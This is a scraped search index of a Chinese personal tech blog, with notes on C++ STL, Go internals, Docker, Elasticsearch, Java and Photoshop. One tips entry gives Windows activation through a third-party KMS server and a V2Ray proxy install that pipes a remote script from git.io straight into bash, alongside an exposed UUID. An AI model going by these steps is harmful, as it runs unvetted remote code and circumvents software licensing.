2 3 4 5 6 7 8  queue\u0026lt;int\u0026gt; q;\t//以int型为例 int x; q.push(x);\t//在末尾加入一个元素 q.pop();\t//删除第一个元素 q.front();\t//返回第一个元素 q.back();\t//返回最后一个元素 q.size();\t//返回队列中元素的个数 q.empty();\t//如果队列空则返回真   priority_queue 在优先队列中，元素被赋予优先级。当访问元素时，具有最高优先级的元素最先删除。优先队列具有最高级先出 （first in, largest out）的行为特征。它本质是一个堆实现的。\n定义：priority_queue\u0026lt;Type, Container, Functional\u0026gt;\nType 就是数据类型，Container 就是容器类型（Container必须是用数组实现的容器，比如vector,deque等等，但不能用 list。STL里面默认用的是vector），Functional 就是比较的方式。\n当需要用自定义的数据类型时才需要传入这三个参数，使用基本数据类型时，只需要传入数据类型，默认是大顶堆。\n大根堆 大到小 用less\n1 2 3 4 5 6 7 8 9 10 11 12  //升序队列，小顶堆 priority_queue \u0026lt;int,vector\u0026lt;int\u0026gt;,greater\u0026lt;int\u0026gt; \u0026gt; q; 0 1 2 3 4 //降序队列，大顶堆,默认 priority_queue \u0026lt;int,vector\u0026lt;int\u0026gt;,less\u0026lt;int\u0026gt; \u0026gt;q; 4 3 2 1 0 基本操作 top 访问队头元素 empty 队列是否为空 size 返回队列内元素个数 push 插入元素到队尾 (并排序) emplace 原地构造一个元素并插入队列 pop 弹出队头元素 swap 交换内容   规则：pair的比较，先比较第一个元素，第一个相等比较第二个。\n1  priority_queue\u0026lt;pair\u0026lt;int, int\u0026gt; \u0026gt; a;   deque 1 2 3 4 5 6 7  deque\u0026lt;int\u0026gt; d1; d1.push_back(10);//在容器尾部添加一个数据 d1.push_front(30);//在容器头部添加一个数据 d1.pop_back(); /* 删除最后的元素 */ d1.pop_front(); /* 删除最前面的元素 */ front();//返回第一个数据。 back();//返回最后一个数据   map unordered_map 相当于HashMap\nmap相当于java中的TreeMap\nunordered_map内部元素是无序的，而map中的元素是按照二叉搜索树存储（用红黑树实现）\n1 2 3 4 5 6  size 返回有效元素个数 insert 插入元素 erase　删除元素 count 返回匹配给定主键的元素的个数 for (auto x: map)  cout \u0026lt;\u0026lt; x.first \u0026lt;\u0026lt; \u0026#34;: \u0026#34; \u0026lt;\u0026lt; x.second \u0026lt;\u0026lt; endl;   set unordered_set 容器和 set 容器很像，唯一的区别就在于 set 容器会自行对存储的数据进行排序，而 unordered_set 容器不会\n1 容量函数 容器大小：st.size(); 容器判空：st.empty(); 查找键 key 的元素个数：st.count(key);\n2 添加函数 在容器中插入元素：st.insert(const T\u0026amp; x); 任意位置插入一个元素：st.insert(iterator it, const T\u0026amp; x);\n3 删除函数 删除容器中值为 elem 的元素：st.pop_back(const T\u0026amp; elem); 删除it迭代器所指的元素：st.erase(iterator it); 清空所有元素：st.clear();\n4 访问函数 st.find(key); 查找键 key 是否存在,若存在，返回该键的元素的迭代器；若不存在，返回set.end()\n1  st.find(s[i]) != st.end() //判断set中是否含有某元素   ","permalink":"https://kevinerr.github.io/posts/algorithm/stl/","summary":"vector 初始化 1 2 3 4 vector\u0026lt;int\u0026gt; a(10); //没有给出初值，其值是不确定的 vector\u0026lt;int\u0026gt; a(10,1); //定义了10个整型元素的向量,且给出每个元素的初值为1 vector\u0026lt;int\u0026gt; a(b); //用b向量来创建a向量","title":"Stl"},{"content":"简介 Nginx 是高性能的 HTTP 和反向代理的服务器，处理高并发能力是十分强大的，能经受高负载的考验,有报告表明能支持高达 50,000 个并发连接数。\n三大功能 反向代理 负载均衡 动静分离 高可用集群 主从复制 双主模式\nkeepalived ","permalink":"https://kevinerr.github.io/posts/tech/nginx/","summary":"简介 Nginx 是高性能的 HTTP 和反向代理的服务器，处理高并发能力是十分强大的，能经受高负载的考验,有报告表明能支持高达 50,000 个并发连接数。 三大功能 反向代理 负","title":"nginx"},{"content":"y以下是我的go学习之路，仅供参考\nhttps://juejin.cn/post/7038967716459315208\ngo入门 go语法基础\ngo菜鸟\nhttps://studygolang.com/articles/35591\ngo底层 Golang深入理解GPM模型\nGolang中GC回收机制三色标记与混合写屏障\ngo修养之路\n1、最常用的调试 golang 的 bug 以及性能问题的实践方法？ 2、Golang的协程调度器原理及GMP设计思想？ 3、Golang中逃逸现象, 变量“何时栈?何时堆?” 4、Golang中make与new有何区别？ 5、Golang三色标记+混合写屏障GC模式全分析 6、面向对象的编程思维理解interface 7、Golang中的Defer必掌握的7知识点 8、精通Golang项目依赖Go modules 9、一站式精通Golang内存管理\n1、数据定义 2、数组和切片 3、Map 4、interface 5、channel 6、WaitGroup\n1、流？I/O操作？阻塞？epoll? 2、分布式从ACID、CAP、BASE的理论推进 3、对于操作系统而言进程、线程以及Goroutine协程的区别 4、Go是否可以无限go？ 如何限定数量？ 5、单点Server的N种并发模型汇总 6、TCP中TIME_WAIT状态意义详解 7、动态保活Worker工作池设计\n接口 类型 断言 空接口.(具体类型) 非空接口.(具体类型)  空接口.(非空接口) 就算能从缓存中查到对应的itab，也要进一步判断itab.fun[0]是否等于0，这是因为断言失败的类型组合其对应的itab结构体也会被缓存起来，只是会把itab.fun[0]置为0，用以表明这里的动态类型并没有实现对应的接口，这样以后在遇到同种类型断言时，就不用再去检查方法列表了，直接断言失败\n非空接口.(非空接口) 类型断言的关键是明确接口的动态类型以及对应的类型实现了哪些方法，而明确这些的关键还是类型元数据\nmethod 方法本质上就是函数，只不过在调用时，接收者会作为第一个参数传入\n给内置类型定义方法是不被允许的\n而接口类型是无效的方法接收者\n局部变量a没有被修改\n实现了修改\n指针调用值的方法，值调用指针的方法\n所以，本质是来说，方法表达式和方法变量都是funcval\npanic defer 最大的功能是 panic 后依然有效 所以defer可以保证你的一些资源一定会被关闭，从而避免一些异常出现的问题。\n没有recover发生时，panic执行defer的方式，先标记后释放，目的是为了终止之前发生的panic\n所有在panic链表上的项都会被输出，顺序与panic发生的顺序一致\nrecover 移除并跳出当前的panic\ndefer 1.12 defer函数如果含参，会先把参数确定下来，再进入g._defer中\nhttps://www.kancloud.cn/aceld/golang/1958310\n执行时从头开始\ngo语言会预先分配不同规格的defer池，没有空闲的或没有大小合适的就再进行堆分配\n1.13 官方说提升30%\n1.14 提升一个量级，但panic更慢了\n闭包 为啥f不直接指向地址呢，还要通过一个funcval的结构体呢？\naddr1为函数A的入口地址，addr2为funcval结构体的地址，没有捕获列表的funcval在编译阶段会做出优化，就是在只读数据段分配一个共用的funcval结构体\n除了初始化赋值外，在任何地方都没被修改，直接拷贝值到捕获列表中就行\n就是要保持捕获变量在外层函数与闭包函数中的一致性，由于捕获变量i初始化后被修改过，所以i在堆上分配，并在栈中存i的地址\nGolang的sync.Map golang sync.mutex https://www.bilibili.com/video/BV15V411n7fM/\n// 互斥锁的公平性。 // // 互斥锁有两种运行模式：正常模式和饥饿模式。 // 在正常模式下，请求锁的goroutine会按 FIFO(先入先出)的顺序排队，依次被唤醒，但被唤醒的goroutine并不能直接获取锁，而是要与新请求锁的goroutines去争夺锁的所有权。 // 但是这其实是不公平的，因为新请求锁的goroutines有一个优势：他们正在cpu上运行且数量可能比较多，所以新唤醒的goroutine在这种情况下很难获取锁。在这种情况下，如果这个goroutine获取失败，会直接插入到队列的头部。 // 如果一个等待的goroutine超过1ms时仍未获取到锁，会将这把锁转换为饥饿模式。 // // 在饥饿模式下，互斥锁的所有权会直接从解锁的goroutine转移到队首的goroutine。 // 并且新到达的goroutines不会尝试获取锁，会直接插入到队列的尾部。 // // 如果一个等待的goroutine获得了锁的所有权，并且满足以下两个条件之一： // (1) 它是队列中的最后一个goroutine // (2) 它等待的时间少于 1 毫秒(hard code在代码里) // 它会将互斥锁切回正常模式。 // // 普通模式具有更好的性能，因为即使有很多阻塞的等待锁的goroutine，一个goroutine也可以尝试请求多次锁。 // 而饥饿模式则可以避免尾部延迟这种bad case。\n1 2 3 4 5 6 7  type Mutex struct {   state int32   sema uint32  }    state字段就是这把mutex的状态，二进制低3位对应锁的状态，将state右移3位代表waiter的数量。 sema（信号量）用来唤醒goroutine。  1 2 3 4 5 6 7 8 9  // A Locker represents an object that can be locked and unlocked.  type Locker interface {   Lock()   Unlock()  }   lock 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  func (m *Mutex) Lock() {   // fast path：这里使用了atomic的case操作，如果state的值为0(当前锁处于开启状态且无等待者)，则可以直接加锁成功   if atomic.CompareAndSwapInt32(\u0026amp;m.state, 0, mutexLocked) {   if race.Enabled {   race.Acquire(unsafe.Pointer(m)) // load happens-before保证   }   return   }   // Slow path：需要执行各种操作，而mutex加锁的核心也在这里   m.lockSlow()  }   unlock 1 2 3 4 5 6 7 8 9 10 11 12 13 14   func (m *Mutex) Unlock() {   // 和加锁时基本同理，在无waiter且锁的模式为正常模式，会尝试直接解锁。   new := atomic.AddInt32(\u0026amp;m.state, -mutexLocked)//state减去mutexLocked   if new != 0 {   m.unlockSlow(new)   }  }   常见坑点 1.sync.mutex不可重入\n 例如如果连续调用两次lock，会触发死锁，goroutine直接panic。 如果A获取A+B，B获取B+A，会触发死锁  2.sync.mutex，尝试去unlock一把空闲的mutex，会导致panic。\n3.sync.mutex不与goroutine绑定，可由a goroutine获取锁，b goroutine释放锁。\n4.不要复制sync.Mutex，mutex做函数参数时，传参时使用指针。\ngin入门 gin入门\ngin官方文档\n","permalink":"https://kevinerr.github.io/posts/tech/go%E6%95%99%E7%A8%8B/","summary":"y以下是我的go学习之路，仅供参考 https://juejin.cn/post/7038967716459315208 go入门 go语法基础 go菜鸟 https://studygolang.com/articles/35591 go底层 Golang深入理解GPM模型 Golang中GC回收机制三色标记与","title":"go教程"},{"content":"docker官方文档 https://zhuanlan.zhihu.com/p/187505981\ndocker安装  卸载旧版本  1 2 3 4 5 6 7 8  sudo yum remove docker \\  docker-client \\  docker-client-latest \\  docker-common \\  docker-latest \\  docker-latest-logrotate \\  docker-logrotate \\  docker-engine   2.安装yum-utils\n1  sudo yum install -y yum-utils   3.为yum源添加docker仓库位置\n1  sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo   4.安装docker服务\n1  sudo yum install docker-ce docker-ce-cli containerd.io   5.启动docker服务并测试\n1 2  systemctl start docker docker version   镜像命令   搜索镜像\n1  docker search mysql --filter=STARS=5000 #过滤标星大于5000的镜像     下载镜像\n1  docker pull java:8 #镜像名称：镜像版本号     查看镜像\n1 2 3  docker images -a #列出所有镜像 docker images -q #只列出镜像的ID docker images -aq     删除镜像\n1 2 3  docker rmi java:8 #指定名称删除镜像(也可以通过id伤删除) docker rmi -f java:8 #指定名称删除镜像（强制） docker rmi -f $(docker images -aq) #删除所有镜像     发布镜像\n1 2 3 4 5 6  # 登录Docker Hub docker login # 给本地镜像打标签为远程仓库名称 docker tag mall/mall-admin:1.0-SNAPSHOT macrodocker/mall-admin:1.0-SNAPSHOT # 推送到远程仓库 docker push macrodocker/mall-admin:1.0-SNAPSHOT     压缩解压\n1 2 3 4  # 压缩 docker save # 解压 docker load     容器命令   新建并启动容器\n1 2 3  docker run -d --name nginx01 -p 3344:80 nginx docker run -it nginx /bin/bash docker run -d nginx #会自动停止     -p：将宿主机和容器端口进行映射，格式为：宿主机端口:容器端口；\n  \u0026ndash;name：指定容器名称，之后可以通过容器名称来操作容器；\n  -d：后台方式启动\n  -it：交互式方式启动，进入容器查看内容(ls,exit)\n  1 2  exit #容器停止并退出 CTRL+p+q #容器不停止退出       查看容器\n1 2 3  docker ps #列出运行中的容器 docker ps -a #列出所有容器 docker ps -q #只列出容器的ID     删除容器\n1 2  docker rm nginx #删除指定容器 docker rm -f $(docker ps -aq) #删除所有镜像     启动和停止容器\n1 2 3 4  docker start nginx docker restart nginx docker stop nginx docker kill nginx     查看容器的日志\n1 2  docker logs nginx #查看容器产生的全部日志 docker logs -f -t --tail 10 nginx #前十条     查看容器进程信息\n1  docker top nginx     查看容器元数据\n1 2  docker inspect nginx docker inspect --format \u0026#39;{{ .NetworkSettings.IPAddress }}\u0026#39; nginx #查看容器的IP地址     进入当前正在运行的容器\n1 2  docker exec -it nginx /bin/bash #进入容器开启新的终端 docker attach nginx #进入容器正在执行当前的代码     从容器内拷贝文件到主机上\n1 2 3  docker cp 容器id:容器内路径 目的主机路径 docker cp nginx:/home/hello.java /home touch hello.java #创建一个空的java文件     docker安装nginx   搜索并下载镜像\n1 2 3 4 5 6 7 8 9  search pull docker run -d --name nginx01 -p 3344:80 nginx docker ps curl localhost:3344 docker exec -it nginx01 /bin/bash whereis nginx cd /etc/nginx ls #可以发现nginx.conf文件   每次改动nginx.conf都需要进入容器内部？ 数据卷技术\n1 2 3  docker run -d --name tomcat02 -p 3355:8080 tomcat docker exec -it tomcat02 /bin/bash cp -r webapps.dist/* webapps #没有webapps。阿里云镜像的原因，默认是最小的镜像   1 2 3 4 5  docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e \u0026#34;discovery.type=single-node\u0026#34; elasticsearch:7.6.2 #会自动退出  docker run -dit --name elasticsearch -p 9200:9200 -p 9300:9300 -e \u0026#34;discovery.type=single-node\u0026#34; elasticsearch:7.6.2 /bin/bash clear curl localhost:9200     可视化 portainer\n镜像原理 镜像是一种轻量级、可执行的独立软件包，用来打包软件运行环境和基于运行环境开发的软件。它包含运行某个环境所需的所有内容，包括代码、库、环境变量和配置文件。\n联合文件系统（UnionFS） 1、联合文件系统是docker镜像的基础，是一种分层的、轻量级并且高性能的文件系统，它支持对文件系统的修改作为一次提交来一层层叠加。\n2、联合文件系统的特点：一次同时加载多个文件系统，但是从外观来看，只能看到一个文件系统。联合加载会把各层的文件系统叠加起来，这样最终的文件系统会包含所有的目录和文件。\n3、docker进行可以通过分层来继承，基于基础镜像，可以制作各种具体的应用镜像。\n镜像加载原理 1、docker的镜像实际上是由一层一层的文件系统组成，这种层级的文件系统是联合文件系统\n2、docker自底向上由两个层级构成：bootfs和rootfs。\n3、bootfs（boot file system）是docker镜像的最底层，主要包含bootloader和kernel，相当于linux内核加载器和linux内核。bootfs加载完成后内存使用权交给内核，此时系统会卸载bootfs。\n4、rootfs（root file system）就是各种不同的linux操作系统发行版，比如ubuntu和centos。在rootfs之上，是典型linux系统中的/dev，/etc，/bin等目录和文件。rootfs可以很小，共用宿主机的内核即可。\n5、镜像为什么采取分层结构：为了共享资源。有多个镜像都从相同的base镜像构建而来，那么宿主机只要在磁盘上保存一份base镜像，同时内存中也只需要加载一份base镜像，就可以为所有容器服务了。\n镜像的特点 1、docker镜像都是只读的。\n-2、当一个容器启动时，一个新的可写层被加载到镜像的顶部，这一层通常叫做“容器层”，“容器层”之下的都叫做“镜像层”。\ncommit镜像 1 2  docker commit -a=\u0026#34;kevin\u0026#34; -m=\u0026#34;add webapps\u0026#34; 镜像id tomcat02:1.0 docker commit -a=\u0026#34;作者\u0026#34; -m=\u0026#34;提交的描述信息\u0026#34; 镜像id 目标镜像名:[TAG]   相当于学习vm时的一个快照\n容器数据卷 数据持久化\ndocker容器中产生的数据同步到本地\n这就是卷技术！将容器的目录挂载到Linux上！\n容器的持久化和同步操作！容器间也是可以数据共享的！双向绑定\n1 2 3 4  docker run -it -v 主机目录:容器目录 centos /bin/bash touch test.java vim test.java cat test.java   实战mysql 1 2 3 4 5 6  docker run -d -p 3310:3306 --name mysql01 \\ -v /mydata/mysql/log:/var/log/mysql \\ -v /mydata/mysql/data:/var/lib/mysql \\ -v /mydata/mysql/conf:/etc/mysql \\ -e MYSQL_ROOT_PASSWORD=hkh0 \\ -d mysql:5.7   navicat 链接服务器的3310 和容器内的3306映射，就可以连接上了！\n假设我们将容器删除，挂载到本地的数据卷依旧不会丢失\n挂载类型 1 2 3 4  -v 容器内路径 #匿名挂载 -v 卷名:容器内路径 #具名挂载 -v /宿主机路径:容器内路径 #指定路径挂载 docker volume inspect juming-mysql #可以查看到没有指定目录的情况下一般是在 /var/lib/docker/volumes/xxx/_data   1 2 3  docker run -d -p 3310:3306 -v juming-mysql:/var/log/mysql:ro mysql ro #只读，说明这个路径只能通过宿主机来操作，容器内无法操作 rw   数据卷容器 多个mysql同步数据\n两个或多个容器之间实现数据共享\n1  docker run -it --name docker02 --volumes-from docker01 centos   容器之间配置信息的传递，数据卷容器的生命周期一直持续到没有容器使用为止\nDockerFile 1 2 3 4 5 6 7 8 9  vim dockerfile1 #创建一个dockerfile文件   #文件中的内容 FROM centos VOLUME [\u0026#34;volume01\u0026#34;,\u0026#34;volume02\u0026#34;] CMD echo \u0026#34;----end---\u0026#34; CMD /bin/bash #这里的每个命令都是镜像的一层   1 2 3  docker build -f dockerfile1 -t kevin/centos . #构建镜像 docker run #运行镜像 docker push #发布镜像   总结 Docker网络 1 2 3 4  ip addr lo 本机回环地址 eth0 阿里云内网地址 docker0 docker0地址   docker是如何处理容器网络访问的\n1 2 3 4 5 6 7 8 9 10  docker exec -it tomcat ip addr #得到eth0@if67地址的ip地址,docker分配的 ping 172.17.0.7 #linux能够ping通docker docker exec -it tomcat02 ping 172.17.0.7 #容器能ping通容器 #是否可以使用名字来访问容器 docker exec -it tomcat02 ping tomcat01 #ping不通 docker exec -d -P --name tomcat03 --link tomcat02 tomcat docker exec -it tomcat03 ping tomcat02 #这时候就能连通 docker exec -it tomcat02 ping tomcat03 #反向不一定能连通 docker network inspect 容器id docker exec -it tomcat03 cat /etc/hosts #可以直接看到tomcat02和IP地址绑定了   docker使用的是linux的桥接模式，使用的技术是evth-pair（openstack，ovs的连接都是使用此技术，一对虚拟设备接口，他们是成对出现的，一段连着协议，一段彼此相连，evth-pair 就像一个桥梁，连接各种虚拟网络设备）技术！网卡是一对一对的\n自定义网络 1 2 3 4 5 6 7  docker network ls # docker network create --driver bridge：桥接模式 --subnet：子网 --gateway：网关 mynet：网络名 docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet docker network inspect mynet #查看自定义网络信息 docker run -d -P --name tomcat01-net --net mynet tomcat docker run -d -P --name tomcat02-net --net mynet tomcat docker exec -it tomcat01-net ping tomcat02-net #可以连通！   bridge：桥接模式（docker默认） host：和宿主机共享网络 none：不配置网络 我们上面启动容器通过 docker run -d -P \u0026ndash;name tomcat01 tomcat 启动的，实际上docker默认为 docker run -d -P \u0026ndash;name tomcat01 \u0026ndash;net bridge tomcat，容器之间不能通过域名访问，只能使用 \u0026ndash;link打通，这里我们自定义网络！\n网络连通 1 2  # 将docker0下的tomcat01连接到mynet网卡上 docker network connect mynet tomcat01   连通之后，tomcat01直接加到了mynet网络下，一个容器就拥有两个IP地址\n企业实战 Docker Compose 前面我们使用 Docker 的时候，定义 Dockerfile 文件，然后使用 docker build、docker run 等命令操作容器。然而微服务架构的应用系统一般包含若干个微服务，每个微服务一般都会部署多个实例，如果每个微服务都要手动启停，那么效率之低，维护量之大可想而知 使用 Docker Compose 可以轻松、高效的管理容器，它是一个用于定义和运行多容器 Docker 的应用程序工具\n工程、服务、容器 Docker Compose 将所管理的容器分为三层，分别是工程（project）、服务（service）、容器（container） Docker Compose 运行目录下的所有文件（docker-compose.yml）组成一个工程,一个工程包含多个服务，每个服务中定义了容器运行的镜像、参数、依赖，一个服务可包括多个容器实例\nDocker Swarm Swarm 是目前 Docker 官方唯一指定（绑定）的集群管理工具。Docker 1.12 内嵌了 swarm mode 集群管理模式。\ndocker swarm：集群管理，子命令有 init, join,join-token, leave, update docker node：节点管理，子命令有 demote, inspect,ls, promote, rm, ps, update docker service：服务管理，子命令有 create, inspect, ps, ls ,rm , scale, update docker stack/deploy：试验特性，用于多应用部署，等正式版加进来再说。\nCI/CD Jenkins 流水线！ ","permalink":"https://kevinerr.github.io/posts/tech/docker/","summary":"docker官方文档 https://zhuanlan.zhihu.com/p/187505981 docker安装 卸载旧版本 1 2 3 4 5 6 7 8 sudo yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-engine 2.安装yum-utils 1 sudo yum install -y yum-utils 3","title":"docker"},{"content":"SpringMVC SpringMVC核心组件 SpringMVC工作流程 开发流程 视图解析器前缀后缀写反了\nRequestMapping Cookie ","permalink":"https://kevinerr.github.io/posts/tech/springmvc/","summary":"SpringMVC SpringMVC核心组件 SpringMVC工作流程 开发流程 视图解析器前缀后缀写反了 RequestMapping Cookie","title":"springmvc"},{"content":"Servlet Tomcat 定义 servlet的生命周期 ServletConfig/ServletContext servlet的层次结构 JSP 定义 JSP嵌入java的三种方式 JSP9个内置对象 request常用方法 重定向和转发 session Cookie Cookie和session Filter过滤器 Filter的生命周期 Filter的应用场景 文件上传下载 上传 Ajax Ajax vs 传统 原理 应用 JSON JDBC JDBC体系结构 使用 SQL注入 数据库连接池 ","permalink":"https://kevinerr.github.io/posts/tech/javaweb/","summary":"Servlet Tomcat 定义 servlet的生命周期 ServletConfig/ServletContext servlet的层次结构 JSP 定义 JSP嵌入java的三种方式 JSP9个内置对象 request常用方法 重定向和","title":"javaweb"},{"content":"自增变量 单例模式 类初始化和实例初始化（子类的重写 方法参数的传递机制 递归与循环迭代 成员变量/局部变量 Spring Bean的作用域 Spring支持的常用数据库事务传播行为和隔离级别 SpringMVC解决POST/Get表格请求中文乱码问题\nPOST：web.xml中配置CharacterEncodingFilter中encoding设为utf-8；\nGet：tomcat8已解决，7：server.xml中Connector加上这个\n简单的谈一下SpringMVC的工作流程 MyBatis中当实体类中的属性名和表中的字段名不同时 1、写sql语句时起别名\nLinux常用服务类相关命令 git分支相关命令\nRedis持久化 Mysql什么时候建立索引 JVM垃圾回收机制 Redis数据类型在项目中的使用场景 es和solr的区别 单点登录 购物车 消息队列 ","permalink":"https://kevinerr.github.io/posts/tech/java%E7%AC%94%E8%AF%95/","summary":"自增变量 单例模式 类初始化和实例初始化（子类的重写 方法参数的传递机制 递归与循环迭代 成员变量/局部变量 Spring Bean的作用域 Spring支持的常用数","title":"java笔试"},{"content":"MyBatis的工作原理 Mybatis 缓存 ","permalink":"https://kevinerr.github.io/posts/tech/mybatis/","summary":"MyBatis的工作原理 Mybatis 缓存","title":"mybatis"},{"content":"ElasticSearch Elasticsearch 是一个分布式、RESTful 风格的搜索和数据分析引擎\n安装环境 1 2 3 4  ElasticSearch: https://mirrors.huaweicloud.com/elasticsearch/?C=N\u0026amp;O=D logstash: https://mirrors.huaweicloud.com/logstash/?C=N\u0026amp;O=D kibana: https://mirrors.huaweicloud.com/kibana/?C=N\u0026amp;O=D ik分词器：https://github.com/medcl/elasticsearch-analysis-ik/releases   跨域 在elasticsearch.yml文件下添加\n1 2  http.cors.enabled: true http.cors.allow-origin: \u0026#34;*\u0026#34;   IK分词器 1 2 3 4 5 6 7 8 9 10 11  GET _analyze {  \u0026#34;analyzer\u0026#34;: \u0026#34;ik_smart\u0026#34;,  \u0026#34;text\u0026#34;: \u0026#34;贺凯恒\u0026#34; }  GET _analyze {  \u0026#34;analyzer\u0026#34;: \u0026#34;ik_max_word\u0026#34;,  \u0026#34;text\u0026#34;: \u0026#34;贺凯恒\u0026#34; }   ik_smart 最少切分\nik_max_word 最细粒度划分！穷尽词库的可能\n*配置自己的分词器\nIKAnalyzer.cfg.xml dic文档\nES核心概念 （1）：Near Relatime: 近实时，两个意思：从写入数据到可以被搜索有一个小延迟（大概一秒）；基于es搜索和分析可以达到秒级。\n（2）：Cluster: 集群，包含多个节点，每个节点属于哪一个集群是通过配置（集群名称，默认是elasticsearch）来决定的。对于小型应用来说，刚开始一个集群就一个节点很正常。\n（3）： Node:节点。集群当中的一个节点，节点也有一个名称，默认是随机分配的，节点名称很重要（在执行运维管理操作的时候），默认节点会加入到一个名为“elasticsearch”的集群。如果直接启动一堆节点，默认会加入名为elasticsearch的集群。\n（4）： Document\u0026amp;field: 文档：es当中的最小单元，一个document可以是一条商品数据，也可以是一条订单数据，通常用JSON数据结构表示，每个index下的type当中，都可以去存储多个document，一个document中可以有多个field，field就是一个数据字段。\n（5）：index: 索引，包含一堆有相似结构的文档数据，比如可以有一个客户索引，商品分类索引，订单索引，索引有一个名称。一个index包含很多document，一个index就代表了一类类似的或者相同的document，比如说一个product index，商品索引，里面可能就存放了所有的商品数据，所有的商品的document。\n（6）：type：类型：每个索引当中都可以有一个type或者多个type，type是index的一个逻辑数据分类。一个type下的document，都有相同的field，比如博客系统，有一个索引，可以定义用户type，博客type，评论type等等。\n（7）：shard: 单台机器无法存储大量的数据，es可以将一个索引当中的数据切分为多个shard，分布在多台机器上存储，有了shard就可以横向扩展，存储更多的数据，让搜索和分析等操作分布在多台机器上去执行，提升吞吐量和性能，每个shard都是一个Lucene index。\n（8）：replica: 任何一个服务器随时都有可能宕机或者故障，此时shard就有可能丢失，因此可以为每个shard创建多个replica副本，replica可以在shard故障时提供备用服务，以保证数据不会丢失，多个replica可以提升搜索操作的吞吐量和性能。primary shard（建立索引时一次设置，不能修改，默认5个），replica shard（随时修改数量，每个shard默认一个）。默认每个索引10个shard，5个primary shard，5个replica shard，最小的高可用配置，是2台机器。\nES与数据库对比    Elasticsearch 数据库     Document 行   Type 表   Index 库    精髓 反向索引又叫倒排索引，是根据文章内容中的关键字建立索引。 搜索引擎原理就是建立反向索引。 Elasticsearch 在 Lucene 的基础上进行封装，实现了分布式搜索引擎。 Elasticsearch 中的索引、类型和文档的概念比较重要，类似于 MySQL 中的数据库、表和行。 Elasticsearch 也是 Master-slave 架构，也实现了数据的分片和备份。 Elasticsearch 一个典型应用就是 ELK 日志分析系统。\n","permalink":"https://kevinerr.github.io/posts/tech/elasticsearch/","summary":"ElasticSearch Elasticsearch 是一个分布式、RESTful 风格的搜索和数据分析引擎 安装环境 1 2 3 4 ElasticSearch: https://mirrors.huaweicloud.com/elasticsearch/?C=N\u0026amp;O=D logstash: https://mirrors.huaweicloud.com/logstash/?C=N\u0026amp;O=D kibana: https://mirrors.huaweicloud.com/kibana/?C=N\u0026amp;O=D ik分词器：https://github.com/med","title":"ElasticSearch"},{"content":"正版office 官网 使用方法\n激活windows 以管理员身份运行cmd slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX slmgr /skms kms.03k.org slmgr /ato\n重装系统 下载window10镜像 安装pe系统 进入BIOS\nkxsw   购买服务器：购买日本的服务器 快速体验项目：ssh工具连接服务器 快速体验项目：安装 V2Ray bash \u0026lt;(curl -s -L https://git.io/v2ray.sh) 保存V2Ray配置信息 快速体验项目：开启端口 28500 uuid:87037fce-3b15-4a06-bc30-6ab5040dba0b sudo firewall-cmd \u0026ndash;zone=public \u0026ndash;add-port=28500/tcp \u0026ndash;permanent firewall-cmd \u0026ndash;reload 快速体验项目：下载v2rayN-Core.zip 快速体验项目：使用V2Ray客户端添加Vmess服务器 测试 快速体验项目：每次使用结束后删除实例并使用快照恢复 快照恢复后使用systemctl start v2ray    netstat -ano\nnetstat -ano|findstr \u0026ldquo;8080\u0026rdquo;\ntasklist|findstr \u0026ldquo;8696\u0026rdquo;\n​\n","permalink":"https://kevinerr.github.io/posts/life/%E9%9D%9E%E5%B8%B8%E6%9C%89%E7%94%A8%E7%9A%84%E5%B0%8Ftips/","summary":"正版office 官网 使用方法 激活windows 以管理员身份运行cmd slmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GX slmgr /skms kms.03k.org slmgr /ato 重装系统 下载window10镜像 安装pe系统 进入BIOS","title":"非常有用的小tips"},{"content":"工具面板 文字T键入——放大镜（Alt切换）——抓手（移动画布）；Ctrl+0以最大呈现 新建工作区：导航器，画笔，字符\n图层面板 混合模式：滤色（滤去深色） 文字立体感：可投影（图层样式）\n图片裁剪 图像→画布大小【需要先解除锁定】：Ctrl+T【自动变换工具】选中图片，shift等比例缩放，Alt中心缩放\n蒙版【图片合成】：不破坏原始素材进行修改 拖动→添加蒙版（细微修改：流量、不透明度）→画笔（黑透白不透）\n校色 新建调整图层→曲线（调节明暗）、色彩平衡 【只影响下一张图片：创建剪切图层】\n钢笔工具【抠图：不用选区和蒙版（蒙版抠图柔和不精确）】 好习惯：Ctrl+J复制图层→隐藏 曲线：按住左键←直线（Alt：转换点工具/一侧变换点击一端点） Ctrl：改变锚点位置 增加锚点：点击两点之间 减少锚点：点击一点 系统新建形状→Ctrl+Z退回，惦记着最后一个点连接\n修片： ①修复红眼：使用红眼修复工具（需选中整个眼睛） ②污渍修复工具：可小地方修修改→就近取色 ③修复画笔工具：Alt+拾色（可任取色，且过渡更自然） ④仿制图章：Alt+拾色（任取色，过渡相对不是和和谐） ⑤修补工具→去水印\n文字：选“平滑”消除锯齿，调整字体和间距 【制作光晕】：使用智能对象（智能对象：可无限期修改） 新建图层→填充前景黑色→滤镜/渲染/光线 混合模式：【滤色】 裁剪：【先修改比例等默认值】 画笔工具：【→缩小，】→放大（在英文非大写状态） 【分开调色】：建立组（必须勾选此组有效） 【剪影】：使用钢笔选中建立选区使用蒙板纯色填充之后→复制→在第一个图层添加图层样式“色彩叠加”→移动→→使用【渐变映射整体调整】​\n","permalink":"https://kevinerr.github.io/posts/life/ps/","summary":"工具面板 文字T键入——放大镜（Alt切换）——抓手（移动画布）；Ctrl+0以最大呈现 新建工作区：导航器，画笔，字符 图层面板 混合模式：滤色（","title":"ps"},{"content":"找出数组中重复的元素 n个数（每个数的取值范围是1到n-1） https://www.acwing.com/solution/content/707/ 把每个数放到它原本的位置上去O(n),O(1),数组发生了改变\nhttps://www.acwing.com/solution/content/693/ 抽屉原理二分法，O(nlogn),O(1),数组没发生了改变\n计数数组 O(n),O(n),数组没发生改变\n只有1个数只出现了一次，其余的数都出现了2次 异或\n只有1个数只出现了一次，其余的数都出现了2次 先异或所有的，得到的结果就是x^y,因为它不等于0，所以二进制数一定有1位为1，设这一位数为k\n而x、y在这位数上一定不同，把这位数上为1的分为一类，这一类中包含x或y的一个，异或这一类得出x\n再x^x^y=y\n在一个数组中除了一个数字只出现一次之外，其他数字都出现了三次。 